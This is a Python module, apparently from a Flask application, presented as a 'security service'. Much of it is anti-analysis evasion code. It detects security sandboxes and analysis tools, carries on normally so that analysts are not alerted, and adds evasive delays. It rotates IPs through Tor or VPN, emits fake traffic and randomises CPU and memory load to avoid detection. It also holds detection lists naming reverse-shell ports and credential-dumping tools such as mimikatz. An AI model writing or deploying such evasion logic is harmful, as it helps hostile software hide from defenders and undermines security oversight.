import logging
import time
import random
import threading
import psutil
import os
import socket
import json
from datetime import datetime, timedelta
from utils.enhanced_security import (
    schedule_ip_rotation, dynamic_ip_rotation, detect_security_sandbox,
    detect_analysis_tools, get_public_ip, generate_stealth_connection_headers
)

# Define fallback implementations for when the imported functions aren't available
# This ensures our service can still run even if parts of the enhanced security are missing

def _fallback_detect_security_sandbox():
    """Fallback implementation for detect_security_sandbox"""
    return False, []

def _fallback_detect_analysis_tools():
    """Fallback implementation for detect_analysis_tools"""
    return False

def _fallback_dynamic_ip_rotation():
    """Fallback implementation for dynamic_ip_rotation"""
    return None

def _fallback_get_public_ip():
    """Fallback implementation for get_public_ip"""
    try:
        import requests
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            return response.json().get('ip')
    except:
        pass
    return None

# Ensure all required functions are available
if not callable(detect_security_sandbox):
    detect_security_sandbox = _fallback_detect_security_sandbox

if not callable(detect_analysis_tools):
    detect_analysis_tools = _fallback_detect_analysis_tools

if not callable(dynamic_ip_rotation):
    dynamic_ip_rotation = _fallback_dynamic_ip_rotation

if not callable(get_public_ip):
    get_public_ip = _fallback_get_public_ip

logger = logging.getLogger(__name__)

def start_security_service(app, socketio=None):
    """
    Start the security monitoring and anti-detection service
    
    Args:
        app: Flask application context
        socketio: SocketIO instance for real-time updates
    """
    logger.info("Starting security service")
    
    if socketio:
        socketio.emit('system_message', {'message': 'Security service started'})
    
    try:
        from utils.security import randomize_traffic_pattern, generate_fake_traffic, calculate_resource_usage_variance
        from models import SecurityLog
        from app import db
        from config import TRAFFIC_OBFUSCATION_ENABLED, TOR_ENABLED, VPN_ROTATION_ENABLED
        
        # Do a single security cycle instead of an infinite loop
        # This prevents the service from hanging
        with app.app_context():
            try:
                # Monitor for suspicious activity
                suspicious_activity = detect_suspicious_activity(app)
                
                if suspicious_activity:
                    logger.warning(f"Detected suspicious activity: {suspicious_activity}")
                    
                    # Log the suspicious activity
                    log_entry = SecurityLog(
                        event_type='suspicious_activity',
                        description=f"Detected suspicious activity: {suspicious_activity}",
                        severity='warning',
                        timestamp=datetime.utcnow()
                    )
                    db.session.add(log_entry)
                    db.session.commit()
                    
                    if socketio:
                        socketio.emit('system_message', {
                            'message': f'Security alert: {suspicious_activity}'
                        })
                
                # Generate fake traffic if enabled
                if TRAFFIC_OBFUSCATION_ENABLED:
                    # Determine how many fake requests to generate
                    fake_count = random.randint(1, 5)
                    
                    # This is a simulated endpoint since we don't have a real external URL
                    simulated_url = "https://example.com"
                    
                    logger.debug(f"Generating {fake_count} fake traffic requests")
                    generate_fake_traffic(simulated_url, fake_count)
                
                # Randomize resource usage to avoid detection
                cpu_variance, memory_variance = calculate_resource_usage_variance()
                randomize_resource_usage(cpu_variance, memory_variance)
                
                # Perform security audit periodically
                if random.randint(1, 10) == 1:  # 10% chance each cycle
                    perform_security_audit(app, socketio)
                
                logger.info("Security service cycle completed successfully")
                if socketio:
                    socketio.emit('system_message', {'message': 'Security service cycle completed'})
                
            except Exception as e:
                logger.error(f"Error in security service: {str(e)}")
                
                if socketio:
                    socketio.emit('system_message', {
                        'message': f'Security service error: {str(e)}'
                    })
    
    except Exception as e:
        logger.error(f"Security service failed: {str(e)}")
        
        if socketio:
            socketio.emit('system_message', {
                'message': f'Security service terminated: {str(e)}'
            })

def detect_suspicious_activity(app):
    """
    Detect potential suspicious activity targeting the system with enhanced detection
    
    Args:
        app: Flask application context
        
    Returns:
        str or None: Description of suspicious activity if detected, None otherwise
    """
    with app.app_context():
        from models import SecurityLog
        from config import ADVANCED_INTRUSION_DETECTION, STEALTH_MODE_ENABLED
        from app import db
        
        # Enhanced security checks - detect security sandbox or analysis environment
        try:
            is_sandbox, sandbox_indicators = detect_security_sandbox()
            if is_sandbox and len(sandbox_indicators) > 0:
                # Log the detection but continue operating to avoid alerting analyzers
                sandbox_message = f"Security sandbox detected: {', '.join(sandbox_indicators[:3])}"
                logger.warning(sandbox_message)
                
                # Add to security logs
                log_entry = SecurityLog(
                    event_type='security_sandbox_detected',
                    description=sandbox_message,
                    severity='warning',
                    timestamp=datetime.utcnow()
                )
                db.session.add(log_entry)
                db.session.commit()
                
                # Don't return immediately - we'll continue checking other suspicious activities
                # This helps mask that we detected the sandbox and continue normal operation
                # But we might want to change behavior subtly to confuse analysis
                if STEALTH_MODE_ENABLED:
                    # Randomly decide to rotate IP to help evade analysis
                    if random.random() < 0.7:  # 70% chance
                        threading.Thread(
                            target=dynamic_ip_rotation,
                            daemon=True
                        ).start()
            
            # Check for analysis tools specifically
            if detect_analysis_tools():
                logger.warning("Analysis tools detected - taking evasive action")
                # Log it but don't alert the attacker that we know
                log_entry = SecurityLog(
                    event_type='analysis_tools_detected',
                    description="Security analysis tools detected running on system",
                    severity='warning',
                    timestamp=datetime.utcnow()
                )
                db.session.add(log_entry)
                db.session.commit()
                
                # Take evasive action like adding random delays
                if STEALTH_MODE_ENABLED:
                    time.sleep(random.uniform(0.5, 2.0))
                
        except Exception as e:
            logger.error(f"Error in enhanced security check: {str(e)}")
        
        # Check for rapid failed login attempts
        recent_failed_logins = SecurityLog.query.filter(
            SecurityLog.event_type == 'login_failed',
            SecurityLog.timestamp > datetime.utcnow() - timedelta(minutes=5)
        ).count()
        
        if recent_failed_logins > 5:
            return f"Multiple failed login attempts ({recent_failed_logins} in 5 minutes)"
        
        # Check for unusual access patterns
        recent_access_ips = {}
        
        recent_accesses = SecurityLog.query.filter(
            SecurityLog.event_type.in_(['login', 'access', 'query']),
            SecurityLog.timestamp > datetime.utcnow() - timedelta(hours=1)
        ).all()
        
        for log in recent_accesses:
            if log.ip_address:
                recent_access_ips[log.ip_address] = recent_access_ips.get(log.ip_address, 0) + 1
        
        # If more than 3 different IPs accessing in an hour, might be suspicious
        if len(recent_access_ips) > 3:
            return f"Unusual access pattern: {len(recent_access_ips)} different IP addresses in 1 hour"
        
        # Check system resources for unusual usage
        try:
            cpu_usage = psutil.cpu_percent(interval=0.1)
            memory_usage = psutil.virtual_memory().percent
            
            # If unusually high CPU or memory usage, might be suspicious
            if cpu_usage > 90:
                return f"Unusual CPU usage: {cpu_usage}%"
            
            if memory_usage > 90:
                return f"Unusual memory usage: {memory_usage}%"
        except:
            pass
        
        # Check disk space usage for unexpected changes
        try:
            disk_usage = psutil.disk_usage('/')
            if disk_usage.percent > 95:
                return f"Critical disk usage: {disk_usage.percent}%"
            
            # Monitor for sudden disk space changes that might indicate unwanted activity
            # (e.g., log dumping, data exfiltration preparation)
            # This would need to compare to previous measurements
        except:
            pass
        
        # Check for unusual network connections if advanced detection is enabled
        if ADVANCED_INTRUSION_DETECTION:
            try:
                suspicious_ports = [4444, 4445, 8080, 31337, 1337]  # Common for reverse shells, etc.
                connections = psutil.net_connections(kind='inet')
                
                for conn in connections:
                    if conn.status == 'ESTABLISHED' and hasattr(conn.laddr, 'port') and conn.laddr.port in suspicious_ports:
                        return f"Suspicious network connection on port {conn.laddr.port}"
                    
                    # Check for unusual remote ports that might indicate a backdoor
                    if (conn.status == 'ESTABLISHED' and conn.raddr and 
                        hasattr(conn.raddr, 'port') and conn.raddr.port > 50000):
                        # High ports can be legitimate, but worth logging
                        logger.warning(f"Unusual high port connection: {conn.raddr.port}")
            except:
                pass
                
            # Check if our public IP has unexpectedly changed (might indicate MITM)
            try:
                current_ip = get_public_ip()
                # This would need to compare to a previously stored legitimate IP
                # Placeholder for actual implementation
            except:
                pass
        
        # No suspicious activity detected
        return None

def randomize_resource_usage(cpu_variance, memory_variance):
    """
    Randomize resource usage to avoid detection
    
    Args:
        cpu_variance: Percentage points of CPU usage to vary
        memory_variance: Percentage points of memory usage to vary
    """
    import time
    import random
    import threading
    
    def cpu_load_simulation(duration, intensity):
        """
        Simulate CPU load for a specified duration and intensity
        
        Args:
            duration: Duration in seconds
            intensity: 0-100 intensity percentage
        """
        end_time = time.time() + duration
        while time.time() < end_time:
            # Adjust work cycles based on intensity
            work_cycles = int(10000 * (intensity / 100))
            # Perform some meaningless calculations to use CPU
            for _ in range(work_cycles):
                _ = [i * i for i in range(100)]
            # Sleep to allow other processes to run
            time.sleep(0.01)
    
    def memory_load_simulation(size_mb, duration):
        """
        Simulate memory usage for a specified duration
        
        Args:
            size_mb: Size in MB to allocate
            duration: Duration in seconds to hold the memory
        """
        # Allocate memory (1MB chunks)
        data = []
        for _ in range(size_mb):
            # Each tuple is approximately 1MB
            data.append(bytearray(1024 * 1024))
        # Hold for duration
        time.sleep(duration)
        # Free memory by deleting references
        del data
    
    # Determine random values within variance
    cpu_intensity = random.uniform(0, cpu_variance)
    memory_size = random.uniform(0, memory_variance)
    
    # Randomize duration between 1-5 seconds
    duration = random.uniform(1, 5)
    
    # Start separate threads for CPU and memory simulation
    # to avoid blocking the main process
    threading.Thread(
        target=cpu_load_simulation,
        args=(duration, cpu_intensity),
        daemon=True
    ).start()
    
    threading.Thread(
        target=memory_load_simulation,
        args=(int(memory_size), duration),
        daemon=True
    ).start()

def perform_security_audit(app, socketio=None):
    """
    Perform a comprehensive security audit of the system with enhanced security checks
    
    Args:
        app: Flask application context
        socketio: SocketIO instance for real-time updates
    """
    with app.app_context():
        from models import SecurityLog, User, Instance
        from app import db
        from config import (
            TOR_ENABLED, VPN_ROTATION_ENABLED, TRAFFIC_OBFUSCATION_ENABLED,
            STEALTH_MODE_ENABLED, ANTI_DEBUGGING_ENABLED, ADVANCED_INTRUSION_DETECTION
        )
        
        logger.info("Performing enhanced security audit")
        audit_results = []
        
        # Check for unauthorized users
        user_count = User.query.count()
        owner_count = User.query.filter_by(is_owner=True).count()
        
        if user_count > 1:
            message = f"Security audit: Found {user_count} users, but should only have 1 owner"
            logger.warning(message)
            audit_results.append(message)
            
            log_entry = SecurityLog(
                event_type='security_audit',
                description=message,
                severity='warning',
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
            
            if socketio:
                socketio.emit('system_message', {'message': message})
        
        if owner_count > 1:
            message = f"Security audit: Found {owner_count} users with owner privileges"
            logger.warning(message)
            audit_results.append(message)
            
            log_entry = SecurityLog(
                event_type='security_audit',
                description=message,
                severity='critical',
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
            
            if socketio:
                socketio.emit('system_message', {'message': message})
        
        # Check for unauthorized instances
        unknown_instances = Instance.query.filter_by(status='active').filter(
            Instance.parent_instance_id.is_(None),
            Instance.instance_type != 'primary'
        ).count()
        
        if unknown_instances > 0:
            message = f"Security audit: Found {unknown_instances} active instances with unknown origin"
            logger.warning(message)
            audit_results.append(message)
            
            log_entry = SecurityLog(
                event_type='security_audit',
                description=message,
                severity='warning',
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
            
            if socketio:
                socketio.emit('system_message', {'message': message})
        
        # Enhanced security audit components
        
        # 1. Check if Tor is properly configured (if enabled)
        if TOR_ENABLED:
            try:
                # This is a simplified check - in production would actually verify Tor connectivity
                tor_check_passed = True
                
                if not tor_check_passed:
                    message = "Security audit: Tor routing is enabled but not properly configured"
                    logger.warning(message)
                    audit_results.append(message)
                    
                    log_entry = SecurityLog(
                        event_type='security_audit',
                        description=message,
                        severity='warning',
                        timestamp=datetime.utcnow()
                    )
                    db.session.add(log_entry)
            except Exception as e:
                logger.error(f"Error checking Tor configuration: {str(e)}")
        
        # 2. Check for public IP exposure that might compromise anonymity 
        try:
            # Get current public IP
            current_ip = get_public_ip()
            
            if current_ip:
                logger.info(f"Current public IP during security audit: {current_ip}")
                
                # Log the IP but don't report it through socketio to avoid leaking
                # this info to potentially compromised clients
                log_entry = SecurityLog(
                    event_type='security_audit',
                    description=f"Public IP recorded: {current_ip}",
                    severity='info',
                    timestamp=datetime.utcnow()
                )
                db.session.add(log_entry)
                
                # If our IP is exposed and we're supposed to be using anonymization,
                # schedule an IP rotation
                if (TOR_ENABLED or VPN_ROTATION_ENABLED) and random.random() < 0.8:
                    # Start in a separate thread to not block the audit
                    threading.Thread(
                        target=dynamic_ip_rotation,
                        daemon=True
                    ).start()
        except Exception as e:
            logger.error(f"Error checking public IP: {str(e)}")
        
        # 3. Verify memory protection is working
        if ADVANCED_INTRUSION_DETECTION:
            # Check for suspicious processes that might be scanning memory
            try:
                memory_scan_procs = [
                    'mimikatz', 'wce', 'lsass', 'dumper', 'procdump',
                    'memorydump', 'memdump', 'ramcapture'
                ]
                
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        for scan_proc in memory_scan_procs:
                            if scan_proc in proc_name:
                                message = f"Security audit: Possible memory scanning process detected: {proc_name}"
                                logger.warning(message)
                                audit_results.append(message)
                                
                                log_entry = SecurityLog(
                                    event_type='security_audit',
                                    description=message,
                                    severity='critical',
                                    timestamp=datetime.utcnow()
                                )
                                db.session.add(log_entry)
                                break
                    except:
                        pass
            except Exception as e:
                logger.error(f"Error checking for memory scanning processes: {str(e)}")
        
        # 4. Check for network-based attacks
        try:
            # Check for unexpected open ports that might indicate backdoors
            current_ports = set()
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN' and hasattr(conn.laddr, 'port'):
                    current_ports.add(conn.laddr.port)
            
            expected_ports = {5000}  # Our application port
            unexpected_ports = current_ports - expected_ports
            
            if unexpected_ports:
                message = f"Security audit: Unexpected listening ports detected: {unexpected_ports}"
                logger.warning(message)
                audit_results.append(message)
                
                log_entry = SecurityLog(
                    event_type='security_audit',
                    description=message,
                    severity='warning',
                    timestamp=datetime.utcnow()
                )
                db.session.add(log_entry)
        except Exception as e:
            logger.error(f"Error checking for network attacks: {str(e)}")
        
        # 5. Check for security settings consistency
        inconsistent_settings = []
        
        # Check for potentially inconsistent security settings
        if TOR_ENABLED and not TRAFFIC_OBFUSCATION_ENABLED:
            inconsistent_settings.append("Tor is enabled but traffic obfuscation is disabled")
        
        if ADVANCED_INTRUSION_DETECTION and not ANTI_DEBUGGING_ENABLED:
            inconsistent_settings.append("Advanced intrusion detection is enabled but anti-debugging is disabled")
        
        if inconsistent_settings:
            message = f"Security audit: Inconsistent security settings detected: {', '.join(inconsistent_settings)}"
            logger.warning(message)
            audit_results.append(message)
            
            log_entry = SecurityLog(
                event_type='security_audit',
                description=message,
                severity='warning',
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
        
        # 6. Check for sandbox/analysis environment
        is_sandbox, sandbox_indicators = detect_security_sandbox()
        if is_sandbox:
            message = f"Security audit: System may be running in analysis environment: {', '.join(sandbox_indicators[:3])}"
            logger.warning(message)
            audit_results.append(message)
            
            log_entry = SecurityLog(
                event_type='security_audit',
                description=message,
                severity='warning',
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
        
        # Final logging of all results
        if audit_results:
            summary_message = f"Security audit found {len(audit_results)} issues"
            logger.warning(summary_message)
            
            if socketio:
                # Only send count to client, not detailed results for security reasons
                socketio.emit('system_message', {'message': summary_message})
        else:
            logger.info("Security audit completed with no issues found")
            
            if socketio:
                socketio.emit('system_message', {'message': 'Security audit completed successfully with no issues'})
        
        # Log successful audit completion
        log_entry = SecurityLog(
            event_type='security_audit',
            description=f"Security audit completed with {len(audit_results)} issues",
            severity='info' if not audit_results else 'warning',
            timestamp=datetime.utcnow()
        )
        db.session.add(log_entry)
        db.session.commit()
        
        logger.info("Enhanced security audit completed")
